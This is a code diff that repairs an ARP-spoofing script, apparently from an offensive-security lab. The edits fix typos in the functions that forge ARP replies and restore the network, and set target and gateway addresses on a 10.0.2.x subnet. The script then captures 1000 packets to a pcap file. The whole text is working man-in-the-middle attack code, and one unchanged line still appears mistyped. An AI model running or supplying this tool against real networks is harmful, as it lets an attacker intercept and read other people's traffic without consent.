@@ -28,8 +28,8 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
     poison_target_hwdst = target_mac
 
     poison_gateway = ARP()
-    posion_target.op = 2
-    posion_target.psrc = target_ip
+    poison_target.op = 2
+    poison_target.psrc = target_ip
     poison_gateway.pdst = gateway_ip
     poison_gateway.hwdst = gateway_mac
 
@@ -46,8 +46,8 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
     return
 
 interface = "eth0"
-target_ip = "10.0.2.14"
-gateway_ip = "10.0.2.2"
+target_ip = "10.0.2.15"
+gateway_ip = "10.0.2.1"
 packet_count = 1000
 
 # set our interface
@@ -88,7 +88,7 @@ try:
     wrpcap('arper.pcap', packets)
 
 # restore the network
-    restore_target(gatewayip,gateway_mac,target_ip,target_mac)
+    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
 
 except KeyboardInterrupt:
 # restore the network
